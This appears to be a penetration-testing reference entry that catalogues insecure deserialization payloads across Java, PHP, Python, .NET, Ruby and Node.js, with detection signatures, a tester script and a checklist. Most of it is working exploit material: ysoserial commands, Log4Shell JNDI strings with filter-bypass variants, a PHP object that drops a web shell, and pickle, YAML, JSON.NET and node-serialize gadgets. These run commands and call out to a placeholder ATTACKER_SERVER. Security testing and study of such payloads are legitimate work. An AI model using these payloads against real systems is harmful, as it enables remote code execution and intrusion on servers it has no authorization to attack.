---
id: "deserialization-payloads"
title: "Deserialization Payloads - Insecure Object Deserialization"
type: "payload"
category: "web-application"
subcategory: "deserialization"
tags: ["deserialization", "rce", "payload", "java", "php", "python", "dotnet"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["attack-workflow-chains", "vulnerability-priority-matrix"]
updated: "2026-04-04"
---

## Overview

Insecure deserialization payloads for Java, PHP, Python, .NET, Ruby, and Node.js. These target endpoints that accept serialized objects — often RCE on first hit. Look for base64-encoded blobs in cookies, POST bodies, and custom headers.

## Detection Signatures

### Identifying Serialized Data

```
JAVA:
  Binary: starts with AC ED 00 05 (hex) or rO0ABX (base64)
  Look in: cookies, POST params, ViewState, custom headers
  Framework clues: Java Server Faces, Apache Struts, Spring

PHP:
  Format: O:4:"User":2:{s:4:"name";s:5:"admin";...}
  Also: a: (array), s: (string), i: (integer), b: (boolean)
  Look in: cookies, session data, POST params

PYTHON:
  Pickle: starts with \x80\x04\x95 (protocol 4) or gASV (base64)
  YAML: !!python/object/apply:os.system
  Look in: cookies, API params, message queues

.NET:
  ViewState: starts with /wEP (base64)
  BinaryFormatter: AAEAAAD/////
  Look in: __VIEWSTATE, cookies, SOAP messages

NODE.JS:
  JSON with _$$ND_FUNC$$_ or function() patterns
  Look in: cookies (node-serialize), API bodies

RUBY:
  Marshal: starts with \x04\x08 (binary)
  YAML: --- !ruby/object:Gem::Installer
  Look in: cookies, session data, API params
```

## Payloads

### Java — ysoserial CommonsCollections

Generate RCE payloads using ysoserial for Java deserialization

- **Contexts**: java, binary
- **Severity**: critical

```bash
# Generate payload (run locally, not on target)
java -jar ysoserial.jar CommonsCollections1 'curl http://ATTACKER_SERVER/rce' | base64

# Common gadget chains to try (in order of likelihood):
# CommonsCollections1-7, CommonsCollectionsK1-K4
# Hibernate1-2
# Spring1-2
# BeanShell1
# JBossInterceptors1
# JavassistWeld1
# Jdk7u21
# URLDNS (detection only, no RCE — always works if deser exists)

# URLDNS detection (safe, no RCE, just confirms deserialization)
java -jar ysoserial.jar URLDNS 'http://ATTACKER_SERVER/java-deser-test' | base64
```

### Java — JNDI Injection

Exploit JNDI lookups (Log4Shell pattern)

- **Contexts**: java, jndi
- **Severity**: critical

```
# Test payloads (inject in any input field, header, or parameter)
${jndi:ldap://ATTACKER_SERVER/test}
${jndi:rmi://ATTACKER_SERVER/test}
${jndi:dns://ATTACKER_SERVER/test}

# Bypass patterns
${${lower:j}ndi:${lower:l}dap://ATTACKER_SERVER/test}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ATTACKER_SERVER/test}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//ATTACKER_SERVER/test}
```

### PHP — unserialize() RCE

PHP object injection via unserialize()

- **Contexts**: php
- **Severity**: critical

```php
# POP chain concept — chain __destruct/__wakeup/__toString methods
# Example: Write arbitrary file
O:8:"Attacker":2:{s:4:"file";s:11:"/tmp/rce.php";s:4:"data";s:29:"<?php system($_GET['c']); ?>";}

# Detection payload — trigger DNS/HTTP callback
O:8:"Attacker":1:{s:3:"url";s:35:"http://ATTACKER_SERVER/php-deser";}

# Phar deserialization (file:// wrapper abuse)
# Upload a crafted .phar file, trigger via:
phar:///uploads/evil.phar/test.txt
```

### Python — Pickle RCE

Python pickle deserialization to RCE

- **Contexts**: python
- **Severity**: critical

```python
# Generate pickle payload (run locally)
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER_SERVER/pickle-rce',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# Detection payload (DNS callback)
import pickle, base64
class Detect:
    def __reduce__(self):
        return (__import__('urllib.request').request.urlopen,
                ('http://ATTACKER_SERVER/pickle-detect',))
print(base64.b64encode(pickle.dumps(Detect())).decode())
```

### Python — YAML Deserialization

Unsafe YAML loading with PyYAML

- **Contexts**: python, yaml
- **Severity**: critical

```yaml
# PyYAML < 5.1 (yaml.load without Loader)
!!python/object/apply:os.system
- 'curl http://ATTACKER_SERVER/yaml-rce'

# Alternative
!!python/object/apply:subprocess.check_output
- ['curl', 'http://ATTACKER_SERVER/yaml-rce']

# Detection
!!python/object/apply:urllib.request.urlopen
- 'http://ATTACKER_SERVER/yaml-detect'
```

### .NET — ViewState Deserialization

.NET ViewState exploitation

- **Contexts**: dotnet, viewstate
- **Severity**: critical

```bash
# If machineKey is known (from web.config disclosure, etc.)
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter \
  -o base64 -c "curl http://ATTACKER_SERVER/viewstate-rce"

# Tools:
# viewgen — generate valid ViewState with custom payload
# blacklist3r — decrypt ViewState to find machineKey
```

### .NET — BinaryFormatter / JSON.NET

.NET BinaryFormatter and Newtonsoft.Json deserialization

- **Contexts**: dotnet
- **Severity**: critical

```json
// JSON.NET with TypeNameHandling enabled
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList",
    "$values": ["cmd", "/c curl http://ATTACKER_SERVER/dotnet-rce"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

### Ruby — Marshal / YAML

Ruby deserialization via Marshal.load or YAML.load

- **Contexts**: ruby
- **Severity**: critical

```yaml
# Ruby YAML deserialization (Psych)
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: curl http://ATTACKER_SERVER/ruby-rce
       method_id: :resolve
```

### Node.js — node-serialize

Node.js deserialization via node-serialize

- **Contexts**: nodejs
- **Severity**: critical

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://ATTACKER_SERVER/node-rce')}()"}
```

## Exploit Template — Generic Deserialization Tester

```python
#!/usr/bin/env python3
"""Deserialization detection script — sends safe detection payloads"""
import requests
import sys

def test_java_deser(url, param, callback):
    """Test for Java deserialization using URLDNS gadget"""
    import subprocess
    # Generate URLDNS payload (safe, no RCE)
    result = subprocess.run(
        ['java', '-jar', 'ysoserial.jar', 'URLDNS', callback],
        capture_output=True
    )
    if result.returncode == 0:
        import base64
        payload = base64.b64encode(result.stdout).decode()
        resp = requests.post(url, data={param: payload})
        print(f"[*] Sent URLDNS payload to {url}")
        print(f"[*] Check {callback} for DNS callback")

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <url> <param> <callback_url>")
        sys.exit(1)
    test_java_deser(sys.argv[1], sys.argv[2], sys.argv[3])
```

## Detection Checklist

```
1. Identify serialized data in the application:
   □ Cookies with base64/binary blobs
   □ Hidden form fields (ViewState)
   □ API parameters accepting objects
   □ Custom headers with encoded data

2. Determine the technology:
   □ AC ED 00 05 / rO0ABX → Java
   □ O:N:"ClassName" → PHP
   □ gASV / \x80\x04 → Python pickle
   □ /wEP → .NET ViewState
   □ _$$ND_FUNC$$_ → Node.js

3. Test with safe detection payloads first:
   □ Java: URLDNS gadget (DNS callback only)
   □ PHP: __wakeup trigger with HTTP callback
   □ Python: urllib callback
   □ All: Use interactsh/Burp Collaborator for OOB

4. If confirmed, escalate carefully:
   □ Use read-only commands first (whoami, id, hostname)
   □ Never run destructive commands
   □ Document the gadget chain used
```
